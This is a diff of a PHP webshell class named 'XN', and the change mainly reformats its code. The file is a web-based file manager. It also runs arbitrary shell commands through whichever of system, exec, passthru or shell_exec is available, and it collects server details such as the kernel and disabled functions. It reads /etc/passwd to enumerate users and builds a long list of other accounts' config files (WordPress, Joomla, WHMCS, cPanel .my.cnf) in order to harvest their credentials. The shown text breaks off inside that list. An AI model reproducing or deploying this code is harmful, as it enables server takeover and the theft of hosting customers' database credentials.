@@ -14,17 +14,10 @@ class XN
         self::$array = [];
         foreach (scandir(getcwd()) as $key => $value) {
             $filename['name'] = getcwd() . XN::SLES() . $value;
-            switch ($type) {
-                case 'dir':
-                    if (!is_dir($filename['name']) ||$value === '.' ||$value === '..') {
-                        continue 2;
-                    }
-                    break;
-                case 'file':
-                    if (!is_file($filename['name'])) {
-                        continue 2;
-                    }
-                    break;
+            switch ($type)
+            {
+                case 'dir':if(!is_dir($filename['name'])||$value==='.'||$value==='..'){continue 2;}break;
+                case 'file':if(!is_file($filename['name'])){continue 2;}break;
             }
             $filename['names'] = basename($filename['name']);
             $filename['owner'] = self::owner($filename['name']);
@@ -34,8 +27,7 @@ class XN
                 : self::size($filename['name']);
 
             self::$array[] = $filename;
-        }
-        return self::$array;
+        }return self::$array;
     }
     public static function save($filename, $data)
     {
@@ -45,62 +37,42 @@ class XN
     }
     public static function size($filename)
     {
-        if (is_file($filename)) {
-            $filepath = $filename;
-            if (!realpath($filepath)) {
-                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
-            }
-            $filesize = filesize($filepath);
-            $array = ["TB", "GB", "MB", "KB", "Byte"];
-            $total = count($array);
-            while ($total-- && $filesize > 1024) {
-                $filesize /= 1024;
-            }
-            return round($filesize, 2) . " " . $array[$total];
+        if (is_file($filename))
+        {
+            $filepath=$filename;
+            if(!realpath($filepath)){$filepath=$_SERVER['DOCUMENT_ROOT'].$filepath;}
+            $filesize=filesize($filepath);
+            $array=["TB","GB","MB","KB","Byte"];
+            $total=count($array);
+            while($total--&&$filesize>1024){$filesize/=1024;}
+            return round($filesize,2)."".$array[$total];
         }
     }
     public static function wr($filename, $perms, $type)
     {
-        if (is_writable($filename)) {
-            switch ($type) {
-                case 1:
-                    print "<font color='#000'>{$perms}</font>";
-                    break;
-                case 2:
-                    print "<font color='green'>{$perms}</font>";
-                    break;
+        if (is_writable($filename))
+        {
+            switch ($type)
+            {
+                case 1:print "<font color='#000'>{$perms}</font>";break;
+                case 2:print "<font color='green'>{$perms}</font>";break;
             }
-        } else {
-            print "<font color='red'>{$perms}</font>";
         }
+        else{print"<font color='red'>{$perms}</font>";}
     }
     public static function perms($filename)
     {
         $perms = @fileperms($filename);
-        switch ($perms & 0xf000) {
-            case 0xc000:
-                $info = 's';
-                break;
-            case 0xa000:
-                $info = 'l';
-                break;
-            case 0x8000:
-                $info = 'r';
-                break;
-            case 0x6000:
-                $info = 'b';
-                break;
-            case 0x4000:
-                $info = 'd';
-                break;
-            case 0x2000:
-                $info = 'c';
-                break;
-            case 0x1000:
-                $info = 'p';
-                break;
-            default:
-                $info = 'u';
+        switch ($perms & 0xf000)
+        {
+        	case 0xc000:$info = 's';break;
+            case 0xa000:$info = 'l';break;
+            case 0x8000:$info = 'r';break;
+            case 0x6000:$info = 'b';break;
+            case 0x4000:$info = 'd';break;
+            case 0x2000:$info = 'c';break;
+            case 0x1000:$info = 'p';break;
+            default:$info = 'u';
         }
         $info .= $perms & 0x0100 ? 'r' : '-';
         $info .= $perms & 0x0080 ? 'w' : '-';
@@ -113,18 +85,9 @@ class XN
         $info .= $perms & 0x0001 ? ($perms & 0x0200 ? 't': 'x'): ($perms & 0x0200 ? 'T': '-');
         return $info;
     }
-    public static function OS()
-    {
-        return substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
-    }
-    public static function getext($filename)
-    {
-        return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    }
-    public static function vers($x)
-    {
-        return print $x;
-    }
+    public static function OS(){return substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";}
+    public static function getext($filename){return strtolower(pathinfo($filename, PATHINFO_EXTENSION));}
+    public static function vers($x){return print $x;}
     public static function geticon($filename)
     {
         switch (self::getext($filename)) {
@@ -135,134 +98,65 @@ class XN
             case 'php5':
             case 'php6':
             case 'phtml':
-            case 'php':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg');
-                break;
+            case 'php':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg');break;
             case 'html':
-            case 'htm':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg');
-                break;
-            case 'css':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg');
-                break;
-            case 'js':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg');
-                break;
-            case 'json':self::vers('https://image.flaticon.com/icons/svg/136/136525.svg');
-                break;
-            case 'xml':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg');
-                break;
-            case 'py':self::vers('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');
-                break;
-            case 'zip':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg');
-                break;
-            case 'rar':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg');
-                break;
-            case 'htaccess':self::vers('https://image.flaticon.com/icons/png/128/1720/1720444.png');
-                break;
-            case 'txt':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg');
-                break;
-            case 'ini':self::vers('https://image.flaticon.com/icons/svg/1126/1126890.svg');
-                break;
-            case 'mp3':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');
-                break;
-            case 'mp4':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');
-                break;
+            case 'htm':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg');break;
+            case 'css':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg');break;
+            case 'js':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg');break;
+            case 'json':self::vers('https://image.flaticon.com/icons/svg/136/136525.svg');break;
+            case 'xml':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg');break;
+            case 'py':self::vers('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');break;
+            case 'zip':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg');break;
+            case 'rar':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg');break;
+            case 'htaccess':self::vers('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
+            case 'txt':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg');break;
+            case 'ini':self::vers('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
+            case 'mp3':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');break;
+            case 'mp4':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');break;
             case 'log':
             case 'log1':
-            case 'log2':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');
-                break;
-            case 'dat':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');
-                break;
-            case 'exe':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');
-                break;
-            case 'apk':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');
-                break;
-            case 'yaml':self::vers('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');
-                break;
-            case 'bak':self::vers('https://image.flaticon.com/icons/svg/2125/2125736.svg');
-                break;
-            case 'ico':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');
-                break;
-            case 'png':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');
-                break;
+            case 'log2':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');break;
+            case 'dat':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');break;
+            case 'exe':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');break;
+            case 'apk':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');break;
+            case 'yaml':self::vers('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
+            case 'bak':self::vers('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
+            case 'ico':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');break;
+            case 'png':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');break;
             case 'jpg':
-            case 'webp':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');
-                break;
-            case 'jpeg':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');
-                break;
-            case 'svg':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');
-                break;
-            case 'gif':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');
-                break;
-            case 'pdf':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');
-                break;
-            case 'asp':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg");
-            	break;
-            case 'doc':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");
-            	break;
-            case 'docx':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");
-            	break;
-            case 'otf':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");
-            	break;
-            case 'ttf':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");
-            	break;
-            case 'wav':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");
-            	break;
-            case 'sql':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");
-            	break;
-            case 'csv':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");
-            	break;
-            case 'bat':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");
-            	break;
-            default:
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/833/833524.svg'
-                );break;
+            case 'webp':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');break;
+            case 'jpeg':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');break;
+            case 'svg':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');break;
+            case 'gif':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');break;
+            case 'pdf':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');break;
+            case 'asp':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg");break;
+            case 'doc':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");break;
+            case 'docx':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");break;
+            case 'otf':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");break;
+            case 'ttf':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");break;
+            case 'wav':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");break;
+            case 'sql':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");break;
+            case 'csv':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");break;
+            case 'bat':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");break;
+            default:self::vers('https://image.flaticon.com/icons/svg/833/833524.svg');break;
         }
     }
     public static function SLES()
     {
-        if (self::OS() == 'Windows') {
-            return str_replace('\\', '/', DIRECTORY_SEPARATOR);
-        } elseif (self::OS() == 'Linux') {
-            return DIRECTORY_SEPARATOR;
-        }
+        if(self::OS()=='Windows'){return str_replace('\\','/',DIRECTORY_SEPARATOR);}
+        elseif(self::OS()=='Linux'){return DIRECTORY_SEPARATOR;}
     }
     public static function exe($cmd)
     {
-        if (function_exists('system')) {
-            @ob_start();
-            @system($cmd);
-            $buff = @ob_get_contents();
-            @ob_end_clean();
-            return $buff;
-        } elseif (function_exists('exec')) {
-            @exec($cmd, $results);
-            $buff = "";
-            foreach ($results as $result) {
-                $buff .= $result;
-            }
-            return $buff;
-        } elseif (function_exists('passthru')) {
-            @ob_start();
-            @passthru($cmd);
-            $buff = @ob_get_contents();
-            @ob_end_clean();
-            return $buff;
-        } elseif (function_exists('shell_exec')) {
-            $buff = @shell_exec($cmd);
-            return $buff;
-        }
+        if (function_exists('system')) {@ob_start();@system($cmd);$buff = @ob_get_contents();@ob_end_clean();return $buff;}
+        elseif(function_exists('exec')){@exec($cmd, $results);$buff = "";foreach($results as $result){$buff.=$result;}return$buff;}
+        elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$buff=@ob_get_contents();@ob_end_clean();return $buff;}
+        elseif(function_exists('shell_exec')){$buff=@shell_exec($cmd);return$buff;}
     }
     public static function color($bold = 1, $colorid = null, $string = null)
     {
-        $color = [
-            "</font>", # 0 off
-            "<font color='red'>", # 1 red
-            "<font color='lime'>", # 2 lime
-            "<font color='white'>", # 3 white
-            "<font color='gold'>", # 4 gold
-        ];
-        return $string !== null
-            ? $color[$colorid] . $string . $color[0]
-            : $color[$colorid];
+        $color = ["</font>","<font color='red'>","<font color='lime'>","<font color='white'>","<font color='gold'>",];
+        return$string!==null?$color[$colorid].$string.$color[0]:$color[$colorid];
     }
     public static function lib_installed()
     {
@@ -277,46 +171,21 @@ class XN
     public static function info($info = null)
     {
         switch ($info) {
-            case 'disable_function':
-                return !empty(@ini_get("disable_functions"))?@ini_get("disable_functions"):"NONE";
-                break;
-            case 'mysql':
-                return function_exists('mysql_connect')?"<font color=green>ON</font>":"<font color=red>OFF</font>";
-                break;
-            case 'ip':
-                return getHostByName(getHostName());
-                break;
-            case 'software':
-                return $_SERVER['SERVER_SOFTWARE'];
-                break;
-            case 'kernel':
-                return php_uname();
-                break;
-            case 'phpversion':
-                return phpversion();
-                break;
-            case 'safe_mode':
-                return @ini_get(strtoupper("safe_mode"))==="ON"?"ON":"OFF";
-                break;
-            case 'lib':
-                return self::lib_installed();
-                break;
+            case 'disable_function':return !empty(@ini_get("disable_functions"))?@ini_get("disable_functions"):"NONE";break;
+            case 'mysql':return function_exists('mysql_connect')?"<font color=green>ON</font>":"<font color=red>OFF</font>";break;
+            case 'ip':return getHostByName(getHostName());break;
+            case 'software':return $_SERVER['SERVER_SOFTWARE'];break;
+            case 'kernel':return php_uname();break;
+            case 'phpversion':return phpversion();break;
+            case 'safe_mode':return @ini_get(strtoupper("safe_mode"))==="ON"?"ON":"OFF";break;
+            case 'lib':return self::lib_installed();break;
             case 'domain':
-                $d0mains = @file("/etc/named.conf", false);
-                if (!$d0mains) {
-                    print "Cant Read /etc/named.conf";
-                    $GLOBALS["need_to_update_header"] = "true";
+            $d0mains = @file("/etc/named.conf", false);
+                if(!$d0mains){print "Cant Read /etc/named.conf";$GLOBALS["need_to_update_header"] = "true";
                 } else {
                     $count = 0;
                     foreach ($d0mains as $d0main) {
-                        if (@strstr($d0main, "zone")) {
-                            preg_match_all('#zone "(.*)"#', $d0main, $domains);
-                            flush();
-                            if (strlen(trim($domains[1][0])) > 2) {
-                                flush();
-                                $count++;
-                            }
-                        }
+                        if (@strstr($d0main, "zone")){preg_match_all('#zone "(.*)"#',$d0main,$domains);flush();if(strlen(trim($domains[1][0]))>2){flush();$count++;}}
                     }
                     print $count . " Domain";
                 }
@@ -327,91 +196,50 @@ class XN
     {
         foreach ($filename as $value) {
             $handle = fopen($value, "w");
-            if (fwrite($handle, $data)) {
-                alert("failed");
-            } else {
-                alert("success");
-            }
+            if(fwrite($handle,$data)){alert("failed");}
+            else{alert("success");}
         }
     }
-    public static function addfolder($path, $mode = 0777)
-    {
-        return !is_dir($path) && !mkdir($path, $mode);
-    }
+    public static function addfolder($path,$mode=0777){return!is_dir($path)&&!mkdir($path,$mode);}
     public static function delete($filename)
     {
         if (is_dir($filename)) {
             $scandir = scandir($filename);
             foreach ($scandir as $object) {
-                if ($object != '.' && $object != '..') {
-                    if (is_dir($filename . DIRECTORY_SEPARATOR . $object)) {
-                        self::delete($filename . DIRECTORY_SEPARATOR . $object);
-                    } else {
-                        @unlink($filename . DIRECTORY_SEPARATOR . $object);
-                    }
+                if ($object!='.'&&$object!='..') {
+                    if (is_dir($filename.DIRECTORY_SEPARATOR.$object))
+                    	{self::delete($filename.DIRECTORY_SEPARATOR.$object);}
+                        else{@unlink($filename.DIRECTORY_SEPARATOR.$object);}
                 }
             }
-            if (@rmdir($filename)) {
-                return true;
-            } else {
-                return false;
-            }
+            if(@rmdir($filename)){return true;}
+            else{return false;}
         } else {
-            if (@unlink($filename)) {
-                return true;
-            } else {
-                return false;
-            }
+            if (@unlink($filename)){return true;}
+            else{return false;}
         }
     }
     public static function owner($filename)
     {
-        if (function_exists("posix_getpwuid")) {
-            self::$owner = @posix_getpwuid(fileowner($filename));
-            self::$owner = self::$owner['name'];
-        } else {
-            self::$owner = fileowner($filename);
-        }
-        if (function_exists("posix_getgrgid")) {
-            self::$group = @posix_getgrgid(filegroup($filename));
-            self::$group = self::$group['name'];
-        } else {
-            self::$group = filegroup($filename);
-        }
-        return self::$owner .
-            "<span class='group'>/" .
-            self::$group .
-            "</span>";
+        if (function_exists("posix_getpwuid"))
+        	{self::$owner=@posix_getpwuid(fileowner($filename));self::$owner=self::$owner['name'];}
+        else{self::$owner=fileowner($filename);}
+        if (function_exists("posix_getgrgid"))
+        	{self::$group=@posix_getgrgid(filegroup($filename));self::$group=self::$group['name'];}
+        else {self::$group=filegroup($filename);}
+        return self::$owner."<span class='group'>/".self::$group."</span>";
     }
-    public static function ftime($filename)
-    {
-        return date('d M Y - H:i A', @filemtime($filename));
-    }
-    public static function renames($filename, $newname)
-    {
-        return rename($filename, $newname);
-    }
-    public static function cd($directory)
-    {
-        return @chdir($directory);
-    }
-    public static function countDir($filename)
-    {
-        return @count(scandir($filename)) - 2;
-    }
+    public static function ftime($filename){return date('d M Y - H:i A', @filemtime($filename));}
+    public static function renames($filename, $newname){return rename($filename, $newname);}
+    public static function cd($directory){return @chdir($directory);}
+    public static function countDir($filename){return @count(scandir($filename)) - 2;}
     public static function listFile($dir, &$output = [])
     {
-        $dirs = scandir($dir);
-        foreach ($dirs as $key => $value) {
-            $location = $dir . DIRECTORY_SEPARATOR . $value;
-            if (!is_dir($location)) {
-                $output[] = $location;
-            } elseif ($value != "." && $value != '..') {
-                self::listFile($location, $output);
-                $output[] = $location;
-            }
-        }
-        return $output;
+        $dirs=scandir($dir);
+        foreach ($dirs as $key=>$value) {
+            $location=$dir.DIRECTORY_SEPARATOR.$value;if(!is_dir($location)){$output[]=$location;}
+            elseif($value!="."&&$value!='..'){self::listFile($location,$output);$output[]=$location;}
+        }return $output;
     }
     public static function adminer($url, $data)
     {
@@ -437,232 +265,25 @@ class XN
         preg_match_all('/(.*?):x:/', $passwd, $matches);
         foreach ($matches[1] as $user) {
             $user_config = '/home/$user/public_html/';
-            if (is_readable($user_config)) {
-                $grab_config = [
-                    "/home/$user/.my.cnf" => "cpanel",
-                    "/home/$user/public_html/config/koneksi.php" => "Lokomedia",
-                    "/home/$user/public_html/forum/config.php" => "phpBB",
-                    "/home/$user/public_html/sites/default/settings.php" => "Drupal",
-                    "/home/$user/public_html/config/settings.inc.php" => "PrestaShop",
-                    "/home/$user/public_html/app/etc/local.xml" => "Magento",
-                    "/home/$user/public_html/admin/config.php" => "OpenCart",
-                    "/home/$user/public_html/application/config/database.php" => "Ellislab",
-                    "/home/$user/public_html/vb/includes/config.php" => "Vbulletin",
-                    "/home/$user/public_html/includes/config.php" => "Vbulletin",
-                    "/home/$user/public_html/forum/includes/config.php" => "Vbulletin",
-                    "/home/$user/public_html/forums/includes/config.php" => "Vbulletin",
-                    "/home/$user/public_html/cc/includes/config.php" => "Vbulletin",
-                    "/home/$user/public_html/inc/config.php" => "MyBB",
-                    "/home/$user/public_html/includes/configure.php" => "OsCommerce",
-                    "/home/$user/public_html/shop/includes/configure.php" => "OsCommerce",
-                    "/home/$user/public_html/os/includes/configure.php" => "OsCommerce",
-                    "/home/$user/public_html/oscom/includes/configure.php" => "OsCommerce",
-                    "/home/$user/public_html/products/includes/configure.php" => "OsCommerce",
-                    "/home/$user/public_html/cart/includes/configure.php" => "OsCommerce",
-                    "/home/$user/public_html/inc/conf_global.php" => "IPB",
-                    "/home/$user/public_html/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/wp/test/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/blog/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/beta/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/portal/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/site/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/wp/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/WP/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/news/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/wordpress/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/test/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/demo/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/home/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/v1/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/v2/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/press/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/new/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/blogs/wp-config.php" => "Wordpress",
-                    "/home/$user/public_html/configuration.php" => "Joomla",
-                    "/home/$user/public_html/blog/configuration.php" => "Joomla",
-                    "/home/$user/public_html/submitticket.php" => "^WHMCS",
-                    "/home/$user/public_html/cms/configuration.php" => "Joomla",
-                    "/home/$user/public_html/beta/configuration.php" => "Joomla",
-                    "/home/$user/public_html/portal/configuration.php" => "Joomla",
-                    "/home/$user/public_html/site/configuration.php" => "Joomla",
-                    "/home/$user/public_html/main/configuration.php" => "Joomla",
-                    "/home/$user/public_html/home/configuration.php" => "Joomla",
-                    "/home/$user/public_html/demo/configuration.php" => "Joomla",
-                    "/home/$user/public_html/test/configuration.php" => "Joomla",
-                    "/home/$user/public_html/v1/configuration.php" => "Joomla",
-                    "/home/$user/public_html/v2/configuration.php" => "Joomla",
-                    "/home/$user/public_html/joomla/configuration.php" => "Joomla",
-                    "/home/$user/public_html/new/configuration.php" => "Joomla",
-                    "/home/$user/public_html/WHMCS/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/whmcs1/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Whmcs/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/whmcs/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/whmcs/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/WHMC/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Whmc/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/whmc/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/WHM/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Whm/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/whm/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/HOST/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Host/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/host/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/SUPPORTES/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Supportes/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/supportes/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/domains/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/domain/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Hosting/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/HOSTING/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/hosting/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/CART/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Cart/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/cart/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/ORDER/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Order/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/order/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/CLIENT/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Client/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/client/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Clientarea/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/clientarea/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/SUPPORT/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Support/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/support/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/BILLING/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Billing/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/billing/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/BUY/sumitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Buy/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/buy/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/MANAGE/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Manage/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/manage/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/ClientSupport/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Clientsupport/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/clientsupport/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/CHECKOUT/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Checkout/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/checkout/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Billings/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/billings/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/BASKET/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Basket/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/basket/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/SECURE/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Secure/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/secure/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/SALES/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Sales/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/sales/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/BILL/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Bill/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/bill/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/PURCHASE/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Purchase/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/purchase/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/ACCOUNT/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Account/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/account/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/USER/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/User/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/user/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/CLIENTS/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Clients/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/clients/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/Billings/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/billings/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/MY/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/My/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/my/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/secure/whm/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/secure/whmcs/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/panel/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/clientes/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/cliente/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/support/order/submitticket.php" => "WHMCS",
-                    "/home/$user/public_html/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/boxbilling/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/box/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/host/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/Host/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/supportes/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/support/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/hosting/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/cart/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/order/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/client/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/clients/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/cliente/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/clientes/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/billing/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/billings/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/my/bb-config.php" => "BoxBilling",
-                    "/home/$user/public_html/secure/bb-config.php" => "BoxBilling",
